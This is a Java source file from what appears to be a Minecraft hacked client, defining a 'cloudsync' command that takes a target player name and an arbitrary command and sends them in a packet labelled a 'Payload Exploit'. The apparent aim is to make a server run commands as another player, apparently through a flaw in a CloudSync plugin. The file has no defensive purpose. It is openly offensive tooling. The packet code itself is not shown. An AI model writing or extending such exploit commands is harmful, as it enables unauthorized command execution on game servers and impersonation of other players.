package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.suggestion.Suggestions;
import com.mojang.brigadier.suggestion.SuggestionsBuilder;
import net.paradise_client.command.Command;
import net.paradise_client.packet.CloudSyncPacket;
import net.paradise_client.Msg;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.client.MinecraftClient;

import java.util.Objects;
import java.util.concurrent.CompletableFuture;

import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.argument;
import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.literal;

public class CloudSyncExploitCommand implements Command {

    @Override
    public LiteralArgumentBuilder<FabricClientCommandSource> register() {
        return literal("cloudsync")
            .executes(this::executeRoot)
            .then(argument("username", StringArgumentType.string())
                .suggests(this::suggestUsernames)
                .then(argument("command", StringArgumentType.greedyString())
                    .executes(this::executeEasyCommandBlocker)));
    }

    private CompletableFuture<Suggestions> suggestUsernames(CommandContext<FabricClientCommandSource> context, SuggestionsBuilder builder) {
        String input = builder.getRemaining().toLowerCase();
        MinecraftClient client = MinecraftClient.getInstance();

        if (client.getNetworkHandler() != null) {
            client.getNetworkHandler().getPlayerList().stream()
                .map(entry -> entry.getProfile().getName())
                .filter(Objects::nonNull)
                .filter(name -> name.toLowerCase().startsWith(input))
                .forEach(builder::suggest);
        }

        return builder.buildFuture();
    }

    private int executeRoot(CommandContext<FabricClientCommandSource> context) {
        Msg.sendFormattedMessage("[CloudSync] &cUsage: ,mcp cloudsync <username> <command>");
        return 0;
    }

    private int executeEasyCommandBlocker(CommandContext<FabricClientCommandSource> context) {
        String username = StringArgumentType.getString(context, "username");
        String command = StringArgumentType.getString(context, "command");
        Msg.sendFormattedMessage("[CloudSync] &aSending the &fcloudsync &aPayload Exploit to the server...");
        CloudSyncPacket.send(username, command);
        return 0;
    }
}
